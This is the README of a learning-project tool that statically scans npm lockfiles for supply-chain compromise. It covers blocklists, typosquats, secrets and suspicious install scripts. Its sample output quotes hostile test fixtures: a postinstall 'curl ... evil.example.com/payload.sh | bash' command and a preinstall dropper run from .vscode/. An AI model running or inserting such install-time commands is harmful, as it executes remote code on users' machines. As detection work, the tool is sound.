# lockfile-analyzer

A learning project for supply chain security. Statically analyzes npm lockfiles (`package-lock.json`, `yarn.lock`) for signs of compromise — no network calls, no external dependencies.

Inspired by two real-world incidents that happened on the same day (March 31, 2026): a malicious version of `axios` was pushed to npm containing a Remote Access Trojan, and Anthropic accidentally shipped Claude Code's internal source code inside a public npm package ([read more](https://venturebeat.com/technology/claude-codes-source-code-appears-to-have-leaked-heres-what-we-know)). Both cases showed that lockfiles are not just boring metadata — they record exactly what got installed, from where, and with what credentials. If something slipped in, the lockfile knows. This tool is my attempt to understand how to detect that programmatically.

A month later, on April 30, 2026, attackers stole npm credentials and used them to inject a malicious `preinstall` script (`node .vscode/setup.mjs`) into the PyTorch Lightning packages. Anyone who installed those packages downstream ran the dropper. That attack motivated the `lifecycle` rule.

## What it detects

| Rule | Severity | What it looks for |
|------|----------|-------------------|
| `blocklist` | HIGH | Known malicious package names |
| `secrets` | HIGH | GitHub tokens, AWS keys, URLs with embedded credentials |
| `typosquat` | HIGH / MEDIUM | Names suspiciously close to popular packages (e.g. `lodahs` vs `lodash`) |
| `transitive` | MEDIUM | Unexpected dependencies with suspicious naming patterns |
| `version` | MEDIUM / LOW | Odd pre-release suffix, git hash version, non-registry source |
| `integrity` | MEDIUM / LOW | Missing or malformed integrity hash |
| `lifecycle` | HIGH / MEDIUM | Suspicious commands in install scripts (curl/wget, pipe-to-shell, scripts hidden in `.vscode/` or `.claude/`) |

## Usage

```bash
python3 -m venv .venv && source .venv/bin/activate

# run without installing
PYTHONPATH=. python -m lockfile_analyzer.main path/to/package-lock.json

# quick test
PYTHONPATH=. python -m lockfile_analyzer.main tests/fixtures/package-lock.json

# see the lifecycle rule in action
PYTHONPATH=. python -m lockfile_analyzer.main tests/fixtures/lifecycle-malicious.json
```

Exit codes: `0` clean, `1` medium/low findings, `2` high findings.

## Sample output

Running against the lifecycle fixture:

```
[HIGH]   pytorch-lightning-clone@2.4.1 [lifecycle]
         'pytorch-lightning-clone@2.4.1' has a 'preinstall' script that references an IDE or tooling config directory (.vscode/, .claude/, .cursor/, .idea/, .github/) — typical hiding place for install-time droppers: 'node .vscode/setup.mjs'
         → Open the referenced file and inspect its contents. Published packages should not execute code from IDE config dirs.

[HIGH]   curl-pipe-attack@1.0.0 [lifecycle]
         'curl-pipe-attack@1.0.0' has a 'postinstall' script that pipes content directly into a shell — classic 'curl | sh' remote-exec pattern: 'curl -fsSL https://evil.example.com/payload.sh | bash'
         → Reject any package that downloads and executes code at install time. Consider 'npm install --ignore-scripts' as a temporary mitigation.

[MEDIUM] sh-dash-c-pkg@1.2.3 [lifecycle]
         'sh-dash-c-pkg@1.2.3' has a 'preinstall' script that invokes a shell with -c (inline command execution): 'bash -c 'echo doing something obscure''
         → Audit the inlined command. Shell -c in install scripts is a common obfuscation vector.

[...4 more findings omitted...]

Scanned 6 packages. Found 7 issue(s): 5 HIGH, 2 MEDIUM, 0 LOW.
```

Output is coloured when stdout is a TTY, plain text otherwise.

## Extending

Add entries to `data/blocklist.txt` or `data/top_packages.txt`. New rules go in `lockfile_analyzer/rules/` — same contract as the existing ones: takes packages, returns findings.

## Requirements

Python 3.11+, stdlib only.

